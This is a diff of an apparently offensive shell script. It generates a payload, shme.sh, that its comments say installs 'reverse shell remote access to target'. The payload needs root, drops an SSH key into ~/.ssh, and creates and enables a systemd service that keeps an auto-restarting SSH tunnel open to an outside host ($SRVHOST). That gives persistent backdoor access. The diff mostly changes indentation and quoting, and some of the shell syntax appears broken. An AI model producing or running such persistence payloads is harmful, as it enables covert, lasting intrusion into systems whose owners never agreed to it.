@@ -78,27 +78,27 @@ mkdir -p payloads
 rm payloads/*
 touch payloads/shme.sh
 payload="#!/bin/bash\
-# single run installation script to establish reverse shell remote access to target\
+    # single run installation script to establish reverse shell remote access to target\
 
-# check run as 'root'
-if (((id -u) > 0)); then
-    echo \"[!] Please run script as root.\"
-    exit
-fi
+    # check run as 'root'
+    if (((id -u) > 0)); then
+        echo \"[!] Please run script as root.\"
+        exit
+    fi
 
-# drop certificate file
-touch ~/.ssh/$rmtUser
-b64crt="$(base64 keys/$rmtUser)"
-base64 -d "\$b64crt" > ~/.ssh/$rmtUser
+    # drop certificate file
+    touch ~/.ssh/$rmtUser
+    b64crt=\"$(base64 keys/$rmtUser)\"
+    base64 -d "\$b64crt" > ~/.ssh/$rmtUser
 
-# drop systemd file
-touch /etc/systemd/system/shme.service
-sysd="[Unit]
+    # drop systemd file
+    touch /etc/systemd/system/shme.service
+    sysd=\"[Unit]
         Description=Remote SSH tunnel to $SRVHOST as user $rmtUser
         Wants=network-online.target
         After=network-online.target
         StartLimitIntervalSec=0
-        
+
         [Service]
         Type=simple
         ExecStart=/usr/bin/ssh -qNn
@@ -112,11 +112,11 @@ sysd="[Unit]
         $rmtUser@$SRVHOST -p $SRVSSH
         Restart=always
         RestartSec=60
-        
+
         [Install]
-        WantedBy=multi-user.target\""
-printf $sysd > /etc/systemd/system/shme.service
-sudo systemctl enable --now shme.service"
+        WantedBy=multi-user.target\"
+    printf $sysd > /etc/systemd/system/shme.service
+    sudo systemctl enable --now shme.service"
 
 printf $payload > payloads/shme.sh
 
